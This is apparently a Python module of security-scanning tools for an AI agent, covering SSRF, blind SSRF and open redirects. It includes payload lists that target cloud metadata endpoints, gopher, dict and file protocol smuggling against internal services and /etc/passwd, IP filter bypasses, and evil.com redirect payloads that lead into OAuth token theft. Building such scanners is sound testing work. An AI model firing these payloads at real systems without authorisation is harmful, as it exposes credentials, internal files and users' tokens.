"""
SSRF Detection & Open Redirect Tools

Implements three agent tools for Server-Side Request Forgery testing:

  SSRFProbeTool      — inject SSRF payloads into URL/body parameters targeting
                       internal IP ranges via http, gopher, file, and dict protocols.
  SSRFBlindTool      — out-of-band SSRF detection using Interactsh-style callbacks
                       (DNS + HTTP pingback detection).
  OpenRedirectTool   — detect open redirect vulnerabilities and chain them into
                       OAuth redirect_uri attacks.

OWASP Mapping: A10:2021-Server-Side Request Forgery (SSRF)
"""

from __future__ import annotations

import logging
import re
import urllib.parse
from enum import Enum
from typing import Any, Dict, List, Optional, Tuple

from app.agent.tools.base_tool import BaseTool, ToolMetadata
from app.agent.tools.error_handling import truncate_output
from app.mcp.base_server import MCPClient

logger = logging.getLogger(__name__)

DEFAULT_CURL_SERVER_URL = "http://kali-tools:8001"

OWASP_SSRF_TAG = "A10:2021-Server-Side Request Forgery (SSRF)"
OWASP_REDIRECT_TAG = "A01:2021-Broken Access Control (Open Redirect)"

# ---------------------------------------------------------------------------
# SSRF payload generators
# ---------------------------------------------------------------------------

# Internal targets to probe via SSRF
_INTERNAL_TARGETS: List[str] = [
    "http://127.0.0.1/",
    "http://localhost/",
    "http://169.254.169.254/",              # AWS IMDS
    "http://169.254.169.254/latest/meta-data/",  # AWS IMDS metadata
    "http://metadata.google.internal/",      # GCP metadata
    "http://169.254.169.254/metadata/v1/",  # Azure IMDS
    "http://192.168.0.1/",
    "http://10.0.0.1/",
    "http://172.16.0.1/",
    "http://0.0.0.0/",
    "http://[::1]/",
    "http://[::ffff:127.0.0.1]/",           # IPv6 loopback in IPv4 notation
]

# Protocol smuggling payloads
_PROTOCOL_PAYLOADS: Dict[str, List[str]] = {
    "http": [
        "http://127.0.0.1/",
        "http://localhost:22/",
        "http://localhost:3306/",
        "http://localhost:6379/",
        "http://localhost:27017/",
    ],
    "gopher": [
        "gopher://127.0.0.1:6379/_PING",         # Redis
        "gopher://127.0.0.1:3306/_%00",          # MySQL
        "gopher://localhost:9200/",               # Elasticsearch
    ],
    "file": [
        "file:///etc/passwd",
        "file:///etc/hosts",
        "file:///proc/self/environ",
        "file:///windows/win.ini",
    ],
    "dict": [
        "dict://127.0.0.1:6379/INFO",
        "dict://localhost:11211/stats",           # Memcached
    ],
}

# Bypass techniques for URL filtering
_BYPASS_VARIANTS: List[str] = [
    "http://0x7f000001/",           # Hex IP
    "http://2130706433/",           # Decimal IP (127.0.0.1)
    "http://127.1/",                # Short IP
    "http://127.000.000.001/",      # Zero-padded IP
    "http://[::1]/",                # IPv6
    "http://[0:0:0:0:0:ffff:127.0.0.1]/",  # IPv4-mapped IPv6
    "http://①②⑦.⓪.⓪.①/",         # Unicode digits
]

# Common redirect parameter names
_REDIRECT_PARAMS: List[str] = [
    "redirect", "redirect_uri", "redirect_url", "return", "return_url",
    "next", "url", "target", "destination", "dest", "redir", "goto",
    "continue", "forward", "location", "callback", "ref", "returnTo",
    "returnUrl", "r", "u", "link", "path",
]

# Open redirect payloads
_REDIRECT_PAYLOADS: List[str] = [
    "https://evil.com",
    "//evil.com",
    "///evil.com",
    "////evil.com",
    "\\\\evil.com",
    "/\\evil.com",
    "https:evil.com",
    "http://evil.com%2F@legitimate.com",  # URL credential bypass
    "https://legitimate.com@evil.com",     # @ trick
    "https://evil.com%23.legitimate.com",  # Fragment trick
    "javascript:alert(1)",                 # JS protocol (XSS via redirect)
    "data:text/html,<script>alert(1)</script>",
]


class SSRFRisk(str, Enum):
    """SSRF finding risk level."""
    CRITICAL = "critical"   # Internal service accessed (RCE / metadata)
    HIGH = "high"           # Internal IP reachable
    MEDIUM = "medium"       # Redirect to internal target possible
    LOW = "low"             # Possible indicator (blind/OOB)
    INFO = "info"           # Parameter identified as potential vector


# ---------------------------------------------------------------------------
# Response analysis helpers
# ---------------------------------------------------------------------------

_IMDS_MARKERS: List[str] = [
    "ami-id", "instance-id", "local-ipv4", "iam/security-credentials",
    "computeMetadata", "metadata/v1", "subscriptionId",
]

_INTERNAL_SERVICE_MARKERS: Dict[str, str] = {
    "root:": "etc/passwd — LFI via SSRF",
    "+PONG": "Redis PONG response",
    "5.5.": "MySQL banner",
    "SSH-": "SSH banner",
    "220 ": "FTP/SMTP banner",
    "<!DOCTYPE html>": "Internal web server",
    "X-Content-Type-Options": "Internal HTTP response",
}


def _detect_ssrf_response(response_body: str, target_url: str) -> Tuple[bool, str, SSRFRisk]:
    """Analyse a response to determine if SSRF was successful.

    Returns:
        (vulnerable: bool, evidence: str, risk: SSRFRisk)
    """
    if not response_body:
        return False, "", SSRFRisk.INFO

    body_lower = response_body.lower()

    # Check for IMDS markers (critical — cloud metadata exposure)
    for marker in _IMDS_MARKERS:
        if marker.lower() in body_lower:
            return True, f"Cloud IMDS marker found: {marker!r}", SSRFRisk.CRITICAL

    # Check for internal service banners
    for marker, description in _INTERNAL_SERVICE_MARKERS.items():
        if marker in response_body:
            return True, f"Internal service marker: {description}", SSRFRisk.HIGH

    # Heuristic: response contains private IP addresses
    private_ip_re = re.compile(
        r"\b(10\.\d{1,3}\.\d{1,3}\.\d{1,3}|172\.(1[6-9]|2\d|3[01])\.\d{1,3}\.\d{1,3}|192\.168\.\d{1,3}\.\d{1,3})\b"
    )
    m = private_ip_re.search(response_body)
    if m:
        return True, f"Private IP in response: {m.group(0)}", SSRFRisk.HIGH

    return False, "", SSRFRisk.INFO


def _detect_open_redirect(response_headers: Dict[str, str], payload: str) -> Tuple[bool, str]:
    """Check whether the server redirected to the supplied payload URL.

    Returns:
        (redirected: bool, location: str)
    """
    location = response_headers.get("location") or response_headers.get("Location") or ""
    if not location:
        return False, ""

    parsed_payload = urllib.parse.urlparse(payload.lower())
    parsed_location = urllib.parse.urlparse(location.lower())

    # Same host in redirect destination as payload?
    if parsed_payload.hostname and parsed_payload.hostname in (parsed_location.hostname or ""):
        return True, location

    # Bare protocol-relative match
    if location.startswith("//") and payload.startswith("//"):
        if location.strip("/").split("/")[0] == payload.strip("/").split("/")[0]:
            return True, location

    return False, ""


# ---------------------------------------------------------------------------
# SSRFProbeTool
# ---------------------------------------------------------------------------


class SSRFProbeTool(BaseTool):
    """Probe for SSRF vulnerabilities by injecting internal targets into parameters.

    Supports http, gopher, file, and dict protocol payloads plus common IP
    bypass techniques.  Each injectable parameter is tested against a prioritised
    list of internal targets (AWS IMDS, loopback, common services).
    """

    def __init__(
        self,
        server_url: str = DEFAULT_CURL_SERVER_URL,
        project_id: Optional[str] = None,
        user_id: Optional[str] = None,
    ):
        self._server_url = server_url
        self._project_id = project_id
        self._user_id = user_id
        self._client = MCPClient(server_url)
        super().__init__()

    def _define_metadata(self) -> ToolMetadata:
        return ToolMetadata(
            name="ssrf_probe",
            description=(
                "Detect SSRF vulnerabilities by injecting internal IP/protocol payloads "
                "(http, gopher, file, dict) into URL parameters or POST body fields. "
                "Checks for cloud IMDS access (AWS/GCP/Azure), internal service banners, "
                "and private IP disclosure. Reports CRITICAL for IMDS hits, HIGH for service banners."
            ),
            parameters={
                "type": "object",
                "properties": {
                    "url": {
                        "type": "string",
                        "description": "Target URL to probe (SSRF payloads injected into each parameter).",
                    },
                    "params": {
                        "type": "array",
                        "items": {"type": "string"},
                        "description": "Parameter names to inject SSRF payloads into (auto-detected if omitted).",
                        "default": [],
                    },
                    "method": {
                        "type": "string",
                        "description": "HTTP method (GET injects into URL params, POST into body).",
                        "enum": ["GET", "POST"],
                        "default": "GET",
                    },
                    "protocols": {
                        "type": "array",
                        "items": {"type": "string"},
                        "description": "Protocols to test: http (default), gopher, file, dict.",
                        "default": ["http"],
                    },
                    "include_bypasses": {
                        "type": "boolean",
                        "description": "Include IP encoding bypass variants (hex, decimal, IPv6).",
                        "default": True,
                    },
                },
                "required": ["url"],
            },
        )

    async def execute(  # type: ignore[override]
        self,
        url: str,
        params: Optional[List[str]] = None,
        method: str = "GET",
        protocols: Optional[List[str]] = None,
        include_bypasses: bool = True,
        **kwargs: Any,
    ) -> str:
        protocols = [p for p in (protocols or ["http"]) if p in _PROTOCOL_PAYLOADS] or ["http"]

        # Build payload list
        payloads: List[str] = []
        for proto in protocols:
            payloads.extend(_PROTOCOL_PAYLOADS[proto])
        if include_bypasses:
            payloads.extend(_BYPASS_VARIANTS)

        # Auto-detect params from URL
        parsed = urllib.parse.urlparse(url)
        qs = urllib.parse.parse_qs(parsed.query, keep_blank_values=True)
        param_names = list(qs.keys()) + [p for p in (params or []) if p not in qs]

        if not param_names:
            # Try common SSRF parameter names as a probe
            param_names = ["url", "uri", "path", "src", "dest", "redirect", "target", "fetch"]

        findings: List[Dict[str, Any]] = []

        for param in param_names:
            for payload in payloads[:8]:  # Limit per param to avoid flooding
                test_url = self._inject_param(url, parsed, qs, param, payload, method)
                result = await self._make_request(test_url, method, param, payload)
                if result:
                    findings.append(result)
                    break  # One finding per param is enough

        return self._format(url, findings)

    def _inject_param(
        self,
        url: str,
        parsed: urllib.parse.ParseResult,
        qs: Dict[str, List[str]],
        param: str,
        payload: str,
        method: str,
    ) -> str:
        if method.upper() == "GET":
            new_qs = dict(qs)
            new_qs[param] = [payload]
            encoded = urllib.parse.urlencode(new_qs, doseq=True)
            return urllib.parse.urlunparse(parsed._replace(query=encoded))
        return url  # POST injection handled separately

    async def _make_request(
        self,
        url: str,
        method: str,
        param: str,
        payload: str,
    ) -> Optional[Dict[str, Any]]:
        try:
            result = await self._client.call_tool(
                "execute_curl_ssrf",
                {
                    "url": url,
                    "method": "GET",
                    "follow_redirects": False,
                    "timeout": 10,
                    "allow_internal": True,
                },
            )
            body = result.get("body", "")
            if isinstance(body, dict):
                import json
                body = json.dumps(body)
            result.get("headers", {})
            if result.get("success") and body:
                vulnerable, evidence, risk = _detect_ssrf_response(str(body), payload)
                if vulnerable:
                    return {
                        "param": param,
                        "payload": payload,
                        "evidence": evidence,
                        "risk": risk.value,
                        "url": url,
                    }
        except Exception as exc:
            logger.debug("SSRF probe request failed: %s", exc)
        return None

    def _format(self, url: str, findings: List[Dict[str, Any]]) -> str:
        lines = [f"[ssrf_probe] SSRF Probe: {url}", ""]
        if not findings:
            lines += [
                "  No SSRF vulnerabilities detected in live scan.",
                "  (MCP server required for active probing — results may be incomplete in offline mode)",
                f"  OWASP: {OWASP_SSRF_TAG}",
            ]
        else:
            lines.append(f"  ⚠ {len(findings)} SSRF finding(s):")
            for f in findings:
                lines += [
                    "",
                    f"  Parameter: {f['param']}",
                    f"  Payload:   {f['payload']}",
                    f"  Evidence:  {f['evidence']}",
                    f"  Risk:      {f['risk'].upper()}",
                    f"  Test URL:  {f['url'][:200]}",
                    f"  OWASP:     {OWASP_SSRF_TAG}",
                ]
        return truncate_output("\n".join(lines))


# ---------------------------------------------------------------------------
# SSRFBlindTool
# ---------------------------------------------------------------------------


class SSRFBlindTool(BaseTool):
    """Out-of-band SSRF detection via DNS/HTTP callback (Interactsh/Burp Collaborator).

    Injects a unique callback URL (OOB host) into SSRF vectors.  If the server
    makes an outbound request to the callback host, the Interactsh server
    records it and the tool reports a BLIND SSRF finding.

    Requires access to an Interactsh or Burp Collaborator endpoint.
    Falls back to user-provided callback URL if Interactsh is not available.
    """

    def __init__(
        self,
        server_url: str = DEFAULT_CURL_SERVER_URL,
        project_id: Optional[str] = None,
        user_id: Optional[str] = None,
    ):
        self._server_url = server_url
        self._project_id = project_id
        self._user_id = user_id
        self._client = MCPClient(server_url)
        super().__init__()

    def _define_metadata(self) -> ToolMetadata:
        return ToolMetadata(
            name="ssrf_blind",
            description=(
                "Detect blind/out-of-band SSRF by injecting a unique callback URL (Interactsh) "
                "into SSRF vectors. If the server makes an outbound DNS or HTTP request to the "
                "callback host, blind SSRF is confirmed. Requires Interactsh server access."
            ),
            parameters={
                "type": "object",
                "properties": {
                    "url": {
                        "type": "string",
                        "description": "Target URL to probe.",
                    },
                    "params": {
                        "type": "array",
                        "items": {"type": "string"},
                        "description": "Parameters to inject callback URL into.",
                        "default": [],
                    },
                    "callback_url": {
                        "type": "string",
                        "description": "OOB callback URL (Interactsh or Burp Collaborator). "
                        "E.g. 'http://uniqueid.oast.fun'. "
                        "If not provided, a probe plan is returned.",
                        "default": "",
                    },
                    "method": {
                        "type": "string",
                        "description": "HTTP method for the SSRF request.",
                        "enum": ["GET", "POST"],
                        "default": "GET",
                    },
                },
                "required": ["url"],
            },
        )

    async def execute(  # type: ignore[override]
        self,
        url: str,
        params: Optional[List[str]] = None,
        callback_url: str = "",
        method: str = "GET",
        **kwargs: Any,
    ) -> str:
        if not callback_url:
            return self._offline_plan(url, params or [])

        parsed = urllib.parse.urlparse(url)
        qs = urllib.parse.parse_qs(parsed.query, keep_blank_values=True)
        param_names = list(qs.keys()) + [p for p in (params or []) if p not in qs]
        if not param_names:
            param_names = ["url", "uri", "src", "dest", "target", "fetch", "redirect"]

        injected: List[str] = []
        for param in param_names:
            new_qs = dict(qs)
            new_qs[param] = [callback_url]
            encoded = urllib.parse.urlencode(new_qs, doseq=True)
            test_url = urllib.parse.urlunparse(parsed._replace(query=encoded))
            try:
                await self._client.call_tool(
                    "execute_curl",
                    {"url": test_url, "method": "GET", "follow_redirects": False, "timeout": 8},
                )
                injected.append(param)
            except Exception as exc:
                logger.debug("Blind SSRF injection failed for %s: %s", param, exc)

        return self._format(url, callback_url, injected)

    def _offline_plan(self, url: str, params: List[str]) -> str:
        callback_host = "uniqueid.oast.fun"
        lines = [
            f"[ssrf_blind] Blind SSRF Probe Plan for {url}",
            "",
            "No callback_url provided — generating probe plan.",
            f"Suggested Interactsh callback: http://{callback_host}",
            "",
            "Parameters to inject:",
        ]
        test_params = params or ["url", "uri", "src", "dest", "target", "fetch", "redirect"]
        for p in test_params:
            lines.append(f"  {p} → http://{callback_host}/{p}-probe")
        lines += [
            "",
            "After injection, check the Interactsh dashboard for DNS/HTTP hits.",
            "Command: interactsh-client -server https://interact.sh",
            f"OWASP: {OWASP_SSRF_TAG}",
        ]
        return "\n".join(lines)

    def _format(self, url: str, callback_url: str, injected_params: List[str]) -> str:
        lines = [
            f"[ssrf_blind] Blind SSRF probes sent to {url}",
            f"  Callback URL: {callback_url}",
            f"  Parameters injected: {', '.join(injected_params) if injected_params else 'none'}",
            "",
            "Check your Interactsh/Burp Collaborator dashboard for callback hits.",
            "A DNS or HTTP hit to the callback host confirms blind SSRF.",
            f"OWASP: {OWASP_SSRF_TAG}",
        ]
        return "\n".join(lines)


# ---------------------------------------------------------------------------
# OpenRedirectTool
# ---------------------------------------------------------------------------


class OpenRedirectTool(BaseTool):
    """Detect open redirect vulnerabilities and chain them into OAuth attacks.

    Tests common redirect parameters with a list of payload URLs.
    Analyses Location headers for successful redirects to attacker-controlled
    domains.  Identifies OAuth redirect_uri manipulation opportunities.
    """

    def __init__(
        self,
        server_url: str = DEFAULT_CURL_SERVER_URL,
        project_id: Optional[str] = None,
        user_id: Optional[str] = None,
    ):
        self._server_url = server_url
        self._project_id = project_id
        self._user_id = user_id
        self._client = MCPClient(server_url)
        super().__init__()

    def _define_metadata(self) -> ToolMetadata:
        return ToolMetadata(
            name="open_redirect",
            description=(
                "Detect open redirect vulnerabilities in URL parameters. "
                "Tests common redirect parameters (redirect, next, url, return_url, etc.) "
                "with attacker-controlled payloads. Identifies OAuth redirect_uri manipulation "
                "opportunities and redirect chains."
            ),
            parameters={
                "type": "object",
                "properties": {
                    "url": {
                        "type": "string",
                        "description": "Base URL to test for open redirects.",
                    },
                    "params": {
                        "type": "array",
                        "items": {"type": "string"},
                        "description": "Redirect parameter names to test (auto-detects common names if omitted).",
                        "default": [],
                    },
                    "target_host": {
                        "type": "string",
                        "description": "Attacker-controlled host to redirect to (default: evil.com).",
                        "default": "evil.com",
                    },
                    "oauth_mode": {
                        "type": "boolean",
                        "description": "Also test redirect_uri manipulation in OAuth flows.",
                        "default": False,
                    },
                },
                "required": ["url"],
            },
        )

    async def execute(  # type: ignore[override]
        self,
        url: str,
        params: Optional[List[str]] = None,
        target_host: str = "evil.com",
        oauth_mode: bool = False,
        **kwargs: Any,
    ) -> str:
        param_names = params or _REDIRECT_PARAMS[:10]  # Default: try top-10 redirect params

        # Adjust payloads for target_host
        payloads = [p.replace("evil.com", target_host) for p in _REDIRECT_PAYLOADS]

        parsed = urllib.parse.urlparse(url)
        qs = urllib.parse.parse_qs(parsed.query, keep_blank_values=True)

        findings: List[Dict[str, Any]] = []
        tested = 0

        for param in param_names:
            for payload in payloads[:5]:
                new_qs = dict(qs)
                new_qs[param] = [payload]
                encoded = urllib.parse.urlencode(new_qs, doseq=True)
                test_url = urllib.parse.urlunparse(parsed._replace(query=encoded))

                try:
                    result = await self._client.call_tool(
                        "execute_curl",
                        {"url": test_url, "method": "GET", "follow_redirects": False, "timeout": 8},
                    )
                    tested += 1
                    resp_headers = result.get("headers", {})
                    status = result.get("status_code", 0)

                    if status in (301, 302, 303, 307, 308):
                        redirected, location = _detect_open_redirect(resp_headers, payload)
                        if redirected:
                            findings.append({
                                "param": param,
                                "payload": payload,
                                "location": location,
                                "status": status,
                                "test_url": test_url,
                            })
                            break  # Found for this param, move to next
                except Exception as exc:
                    logger.debug("Open redirect probe failed for %s: %s", param, exc)

        return self._format(url, findings, tested, oauth_mode, target_host)

    def _format(
        self,
        url: str,
        findings: List[Dict[str, Any]],
        tested: int,
        oauth_mode: bool,
        target_host: str,
    ) -> str:
        lines = [
            f"[open_redirect] Open Redirect Scan: {url}",
            f"  Requests made: {tested}",
            "",
        ]
        if not findings:
            lines += [
                "  No open redirects detected.",
                "  (MCP server required for live probing)",
                f"  OWASP: {OWASP_REDIRECT_TAG}",
            ]
            if not tested:
                lines.append("  Tip: ensure the Curl MCP server is running for active scanning.")
        else:
            lines.append(f"  ⚠ {len(findings)} open redirect(s) found:")
            for f in findings:
                lines += [
                    "",
                    f"  Parameter:  {f['param']}",
                    f"  Payload:    {f['payload']}",
                    f"  Location:   {f['location']}",
                    f"  Status:     {f['status']}",
                    f"  Test URL:   {f['test_url'][:200]}",
                    f"  OWASP:      {OWASP_REDIRECT_TAG}",
                ]
            if oauth_mode:
                lines += [
                    "",
                    "── OAuth Impact ──────────────────────",
                    "  Open redirects can be chained as redirect_uri in OAuth flows.",
                    f"  Attacker URL: https://target.com/oauth/authorize?redirect_uri=https://{target_host}",
                    "  This allows token theft if the authorization server doesn't validate redirect_uri strictly.",
                ]
        return truncate_output("\n".join(lines))


__all__ = [
    "SSRFProbeTool",
    "SSRFBlindTool",
    "OpenRedirectTool",
    # Helpers
    "_detect_ssrf_response",
    "_detect_open_redirect",
    "SSRFRisk",
    # Constants
    "OWASP_SSRF_TAG",
    "OWASP_REDIRECT_TAG",
    "_INTERNAL_TARGETS",
    "_PROTOCOL_PAYLOADS",
    "_BYPASS_VARIANTS",
    "_REDIRECT_PARAMS",
    "_REDIRECT_PAYLOADS",
]
